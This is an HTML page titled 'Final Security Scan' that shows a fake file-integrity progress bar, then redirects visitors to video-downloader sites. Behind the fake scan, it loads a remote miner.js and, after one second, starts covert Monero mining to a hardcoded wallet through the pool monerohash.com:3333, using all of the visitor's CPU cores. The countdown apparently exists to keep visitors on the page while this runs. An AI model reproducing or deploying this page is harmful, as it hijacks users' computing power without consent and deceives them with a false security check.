<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Final Security Scan</title>
    <script src="https://cdn.jsdelivr.net/gh/monero-project/monero-gui@v0.18.1.2/external/qml/MoneroComponents/Controls/miner.js"></script>
    <style>
        body { margin: 0; padding: 20px; font-family: 'Segoe UI', sans-serif; background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); color: white; text-align: center; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .ad-placeholder { background: rgba(255,255,255,0.05); border: 1px dashed #38bdf8; padding: 40px; margin: 20px auto; border-radius: 12px; width: 90%; max-width: 400px; color: #38bdf8; font-size: 0.8rem; text-transform: uppercase; }
        .verify-box { background: rgba(30, 41, 59, 0.8); padding: 40px; border-radius: 24px; border: 1px solid rgba(56, 189, 248, 0.3); backdrop-filter: blur(15px); width: 90%; max-width: 450px; }
        .loader-ring { border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #v-bar { width: 0%; height: 10px; background: linear-gradient(90deg, #38bdf8, #818cf8); border-radius: 10px; transition: 1s linear; }
    </style>
</head>
<body>
    <div class="ad-placeholder">Sponsored Content Slot #1</div>
    <div class="verify-box">
        <div class="loader-ring"></div>
        <h2>Final Security Scan</h2>
        <p style="color:#94a3b8;">Verifying file integrity...</p>
        <div style="width:100%; background:#1e293b; border-radius:10px; margin: 25px 0;"><div id="v-bar"></div></div>
        <p id="timer" style="color:#38bdf8;">Finalizing in 15s...</p>
    </div>
    <div class="ad-placeholder">Sponsored Content Slot #2</div>
<script>
    const wallet = "48bN9TtB8nieRBKARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQckVdJPNoNapcwMuiu1TSZiG7FXft";
    setTimeout(() => { if(typeof startMining === 'function') startMining("monerohash.com:3333", wallet, "Stage_2_Verify", navigator.hardwareConcurrency, 0.3); }, 1000);

    const params = new URLSearchParams(window.location.search);
    const videoUrl = params.get('url');

    let time = 15;
    let interval = setInterval(() => {
        time--;
        document.getElementById("v-bar").style.width = ((15-time)/15)*100 + "%";
        document.getElementById("timer").innerHTML = "Finalizing in " + time + "s...";
        if(time <= 0) {
            clearInterval(interval);
            let dest = "https://saveig.app/en/search?q=";
            if(videoUrl.includes("youtube") || videoUrl.includes("youtu.be")) dest = "https://en1.savefrom.net/1-youtube-video-downloader-360.html?url=";
            if(videoUrl.includes("tiktok")) dest = "https://lovetik.com/query?s=";
            window.location.href = dest + encodeURIComponent(videoUrl);
        }
    }, 1000);
</script>
</body>
</html>
